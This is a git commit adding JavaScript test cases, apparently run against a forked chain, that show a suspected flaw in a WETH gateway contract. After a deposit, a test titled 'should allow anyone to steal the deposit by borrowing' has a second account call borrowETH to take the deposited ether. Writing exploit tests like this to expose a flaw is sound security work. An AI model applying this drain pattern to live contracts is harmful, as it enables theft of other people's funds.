10ac391b17bc42d89f03b44bf3175324d23b02c3
Daniel Nolan <DanNolan99@gmail.com>
2021-03-11 11:47:04 -0500

    shows potential exploited code in test cases

--- test/test.js
+++ test/test.js
@@ -1,5 +1,7 @@
 const { assert } = require("chai");
 const lendingPoolAddress = "0x987115C38Fd9Fd2aA2c6F1718451D167c13a3186";
+const wethGatewayAddress = "0xDcD33426BA191383f1c9B431A342498fdac73488";
+const wethAddress = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
 
 describe("Pool", function () {
     let contract;
@@ -29,5 +31,35 @@ describe("Pool", function () {
         it("should be destroyed", async function () {
             assert.equal(await ethers.provider.getCode(pool.address), "0x", "Expected the pool to be destroyed");
         });
+    });
+
+    describe('depositing into wethGateway', () => {
+      const deposit = ethers.utils.parseEther("10");
+      let gateway, weth;
+      before(async () => {
+        gateway = await ethers.getContractAt("IWETHGateway", wethGatewayAddress);
+        weth = await ethers.getContractAt("IERC20", wethAddress);
+        const onBehalfOf = await ethers.provider.getSigner(0).getAddress();
+        await gateway.depositETH(onBehalfOf, 0, { value: deposit });
+      });
+
+      it('should hold the deposit in the pool', async () => {
+        const balance = await weth.balanceOf(gateway.address);
+        assert.equal(balance.toString(), deposit.toString());
+      });
+
+      it('should allow anyone to steal the deposit by borrowing', async () => {
+        const signer1 = ethers.provider.getSigner(1);
+        const address1 = await signer1.getAddress();
+
+        const balanceBefore = await ethers.provider.getBalance(address1);
+        const tx = await gateway.connect(signer1).borrowETH(deposit, 0, 0);
+        const receipt = await tx.wait();
+        const gasCost = tx.gasPrice.mul(receipt.gasUsed);
+        const balanceAfter = await ethers.provider.getBalance(address1);
+        const actual = balanceAfter.sub(balanceBefore).add(gasCost);
+
+        assert.equal(actual.toString(), deposit.toString());
+      });
     });
 });
